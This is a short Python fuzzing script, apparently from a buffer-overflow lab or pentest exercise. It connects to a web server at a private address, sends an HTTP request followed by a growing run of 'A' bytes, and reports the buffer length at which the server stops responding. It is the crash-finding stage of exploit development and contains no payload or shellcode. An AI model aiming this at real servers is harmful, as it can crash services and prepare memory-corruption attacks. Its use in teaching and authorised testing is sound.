#!/usr/bin/python3

import socket
import sys
from time import sleep

buffer = b'A' * 1000  # Increase buffer size, using bytes

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.1.180', 80))

        # Send a simple HTTP request
        http_request = b"GET / HTTP/1.1\r\nHost: 192.168.1.180\r\n\r\n"
        s.send(http_request)

        print('[*] Sending buffer with length: ' + str(len(buffer)))
        s.send(buffer)
        s.close()
        sleep(2)
        buffer = buffer + b'A' * 1000

    except:
        print('[*] Crash occurred at buffer length: ' + str(len(buffer) - 1000))
        sys.exit()
